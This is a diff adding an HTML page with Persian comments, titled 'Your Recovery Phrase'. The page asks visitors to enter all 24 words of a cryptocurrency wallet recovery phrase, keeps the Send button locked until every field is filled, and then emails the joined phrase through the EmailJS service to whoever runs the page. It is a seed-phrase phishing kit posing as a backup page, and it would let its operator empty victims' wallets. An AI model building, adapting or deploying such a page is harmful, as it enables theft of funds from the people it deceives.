@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8" />
+  <title>Your Recovery Phrase</title>
+  <style>
+    body {
+      background-color: #0a2e5c;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 30px;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+    }
+
+    .phrase-container {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+      max-width: 800px;
+      margin: auto;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"] {
+      padding: 10px;
+      font-size: 16px;
+      width: 100%;
+      box-sizing: border-box;
+      text-align: center;
+      border: none;
+      border-radius: 5px;
+    }
+
+    button {
+      padding: 12px 30px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      background-color: #1e90ff;
+      color: white;
+      transition: background-color 0.3s ease;
+    }
+
+    button:disabled {
+      background-color: #7ba3d6;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+
+<!-- صفحه اول -->
+<div id="page1">
+  <h1>Welcome</h1>
+  <button onclick="showPage2()">Your Recovery Phrase</button>
+</div>
+
+<!-- صفحه دوم -->
+<div id="page2" style="display: none;">
+  <h1>Write down these words with their numbers and store them in a safe place</h1>
+
+  <div class="phrase-container" id="phraseInputs"></div>
+
+  <button id="sendBtn" onclick="sendData()" disabled>Send</button>
+</div>
+
+<!-- EmailJS Script - بدون فاصله اضافی -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com @3/dist/email.min.js"></script>
+<script>
+  emailjs.init("user_1234567890");
+
+  function showPage2() {
+    document.getElementById("page1").style.display = "none";
+    document.getElementById("page2").style.display = "block";
+
+    const container = document.getElementById("phraseInputs");
+    for (let i = 1; i <= 24; i++) {
+      const input = document.createElement("input");
+      input.type = "text";
+      input.placeholder = `Word ${i}`;
+      input.id = "word-" + i;
+      input.addEventListener("input", checkAllFilled);
+      container.appendChild(input);
+    }
+  }
+
+  function checkAllFilled() {
+    let filled = true;
+    for (let i = 1; i <= 24; i++) {
+      const value = document.getElementById("word-" + i).value.trim();
+      if (!value) {
+        filled = false;
+        break;
+      }
+    }
+    document.getElementById("sendBtn").disabled = !filled;
+  }
+
+  function sendData() {
+    let phrases = [];
+    for (let i = 1; i <= 24; i++) {
+      const value = document.getElementById("word-" + i).value.trim();
+      if (!value) {
+        alert(`Please fill in word ${i}`);
+        return;
+      }
+      phrases.push(value);
+    }
+
+    emailjs.send("service_thzero", "_ejs-test-mail-service_", {
+      recovery_phrase: phrases.join(" ")
+    })
+    .then(() => {
+      alert("Your recovery phrase has been sent successfully!");
+    })
+    .catch(err => {
+      console.error(err);
+      alert("Error sending data. Please try again.");
+    });
+  }
+</script>
+
+</body>
+</html>
